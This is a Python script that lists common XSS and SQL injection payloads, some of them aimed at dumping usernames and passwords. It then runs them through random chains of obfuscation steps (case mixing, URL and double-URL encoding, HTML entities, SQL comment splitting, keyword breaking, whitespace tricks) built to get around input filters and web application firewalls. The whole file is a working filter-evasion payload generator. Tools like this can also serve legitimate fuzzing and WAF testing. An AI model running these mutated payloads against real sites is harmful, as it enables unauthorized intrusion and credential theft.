import random
import urllib.parse

# Stronger payload list
payloads = [
    # XSS
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<a href='javascript:alert(1)'>click</a>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",

    # SQL Injection
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT username,password FROM users --",
    "' OR 'a'='a",
    "' AND 1=0 UNION SELECT null,null --",
    "' OR ''='",
    "' OR 1=1#",
    "\" OR 1=1 --",
    "' UNION SELECT null, version() --",
    "' OR username LIKE '%admin%' --"
]

# -------------------------
# Mutation functions
# -------------------------

def case_mutation(payload):
    return "".join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in payload
    )

def space_injection(payload):
    return payload.replace("<", "< ").replace(">", " >")

def url_encode(payload):
    return urllib.parse.quote(payload)

def double_url_encode(payload):
    return urllib.parse.quote(urllib.parse.quote(payload))

def html_entity_encode(payload):
    return "".join(f"&#{ord(c)};" if c not in [" ", "\t", "\n"] else c for c in payload)

def comment_injection(payload):
    return payload.replace(" ", "/**/")

def tab_injection(payload):
    return payload.replace(" ", "\t")

def newline_injection(payload):
    return payload.replace(" ", "\n")

def keyword_breaking(payload):
    replacements = {
        "script": "scr<script>ipt",
        "SELECT": "SE/**/LECT",
        "UNION": "UN/**/ION",
        "OR": "O/**/R",
        "AND": "A/**/ND"
    }

    result = payload
    for old, new in replacements.items():
        result = result.replace(old, new)
        result = result.replace(old.lower(), new.lower())
    return result

def quote_variation(payload):
    return payload.replace("'", "\"") if "'" in payload else payload.replace("\"", "'")

def random_whitespace(payload):
    chars = []
    for ch in payload:
        chars.append(ch)
        if ch in ["<", ">", "=", "/"] and random.random() > 0.7:
            chars.append(random.choice([" ", "\t", "\n"]))
    return "".join(chars)

def slash_duplication(payload):
    return payload.replace("/", "//")

# -------------------------
# Technique pool
# -------------------------

techniques = [
    case_mutation,
    space_injection,
    url_encode,
    double_url_encode,
    html_entity_encode,
    comment_injection,
    tab_injection,
    newline_injection,
    keyword_breaking,
    quote_variation,
    random_whitespace,
    slash_duplication
]

# -------------------------
# Multi-mutation engine
# -------------------------

def mutate_once(payload):
    technique = random.choice(techniques)
    return technique(payload), technique.__name__

def mutate(payload, min_steps=2, max_steps=4):
    mutated = payload
    applied = []

    steps = random.randint(min_steps, max_steps)

    for _ in range(steps):
        mutated, technique_name = mutate_once(mutated)
        applied.append(technique_name)

    return mutated

def mutate_with_trace(payload, min_steps=2, max_steps=4):
    mutated = payload
    applied = []

    steps = random.randint(min_steps, max_steps)

    for _ in range(steps):
        mutated, technique_name = mutate_once(mutated)
        applied.append(technique_name)

    return mutated, applied

# -------------------------
# Test mode
# -------------------------

if __name__ == "__main__":
    print("Original → Mutated\n")
    for p in payloads:
        mutated, applied = mutate_with_trace(p)
        print(f"Original : {p}")
        print(f"Mutated  : {mutated}")
        print(f"Applied  : {applied}")
        print("-" * 80)